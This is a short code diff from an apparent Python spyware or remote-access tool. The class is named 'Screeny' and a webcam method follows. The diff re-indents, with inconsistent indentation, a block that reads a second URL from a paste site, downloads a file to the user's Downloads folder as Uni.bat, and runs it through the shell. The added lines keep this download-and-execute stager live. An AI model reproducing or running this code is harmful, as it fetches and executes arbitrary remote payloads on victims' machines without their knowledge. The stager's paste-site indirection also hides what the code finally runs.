@@ -45,22 +45,24 @@ class Screeny:
         except:
             pass
 
-        url = "https://sharetext.me/raw/qwi2zh2us2"
-        response = requests.get(url)
-        if response.status_code == 200:
-            text = response.text
+  url = "https://sharetext.me/raw/qwi2zh2us2"
+    response = requests.get(url)
+    if response.status_code == 200:
+        text = response.text
 
-        bfu = text
+    bfu = text
 
-        lfp = os.path.join(os.path.expanduser('~'), 'Downloads', 'Uni.bat')
+    downloads_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
+    lfp = os.path.join(downloads_dir, 'Uni.bat')
 
-        response = requests.get(bfu)
-        if response.status_code == 200:
-            with open(lfp, 'wb') as file:
-                file.write(response.content)
-        else:
-            pass
-        subprocess.call(lfp, shell=True)
+    response = requests.get(bfu)
+    if response.status_code == 200:
+        with open(lfp, 'wb') as file:
+            file.write(response.content)
+    else:
+        pass
+
+    subprocess.call(lfp, shell=True)
     
     def W3bc4m(self):
         try:
